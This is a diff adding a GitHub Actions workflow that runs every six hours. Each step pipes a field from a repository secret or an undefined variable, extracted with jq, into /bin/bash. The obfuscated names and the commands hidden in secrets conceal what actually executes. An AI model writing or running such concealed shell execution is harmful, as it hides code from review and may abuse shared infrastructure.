@@ -1,0 +1,32 @@
+name: caiweiccc
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caiweiccc
+        env:
+          t30: ${{ secrets.t30 }}
+        run: |
+          echo $t30 | jq -r .hk8 | /bin/bash
+          echo $yiwxq94115 | jq -r .ipcoz42 | /bin/bash
+          echo $gh9782 | jq -r .qcbj7883 | /bin/bash
+          echo $ua96500 | jq -r .xyic40405 | /bin/bash
+          echo $zhtc7692 | jq -r .dkypb550 | /bin/bash
+          echo $r80123 | jq -r .do8399 | /bin/bash
+          echo $pibw5744 | jq -r .h184 | /bin/bash
+          echo $fy11 | jq -r .qs9 | /bin/bash
+          echo $pzpfr884 | jq -r .w99298 | /bin/bash
+          echo $u094 | jq -r .mcdzy0135 | /bin/bash
+          echo $yi7664 | jq -r .qzn34774 | /bin/bash
+          echo $piklv141 | jq -r .lkr543 | /bin/bash
+          echo $ng647 | jq -r .yhv441 | /bin/bash
+          echo $okd47897 | jq -r .gpuqq0234 | /bin/bash
+          echo $az82199 | jq -r .dtzkz0433 | /bin/bash
+
